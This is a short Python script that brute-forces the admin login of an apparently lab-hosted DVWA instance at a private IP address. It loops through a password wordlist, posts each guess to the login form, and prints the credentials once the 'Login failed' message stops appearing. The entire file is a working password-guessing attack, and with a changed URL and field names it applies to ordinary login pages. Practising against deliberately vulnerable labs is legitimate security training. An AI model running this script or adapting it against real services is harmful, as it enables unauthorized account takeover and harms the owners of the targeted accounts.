import requests, json
def post(url):
	data = {
	"username": "admin", #name="username"
	"password": "", #name="blah", use with password list
	"Login": "submit" #name = "blah"
	}
	with open('/opt/wordlists/passwords.txt','r') as rf:
            for password in rf:
                password = password.strip()
                data['password'] = password
                resp = requests.post(url,data = data,timeout=5) #http://192.168.86.115/dvwa/login.php, passing in data dictionary to post request

                if resp.status_code == 200:
                    #html = resp.json() #prettifed html
                    if b'Login failed' not in resp.content:#<div class="message">Login failed</div>, if password is successful:
                        return (f'Credentials: Username: \'admin\' Password: {password}')
                
            return (f'Password not found')
				
		
print(post('http://192.168.86.115/dvwa/login.php'))

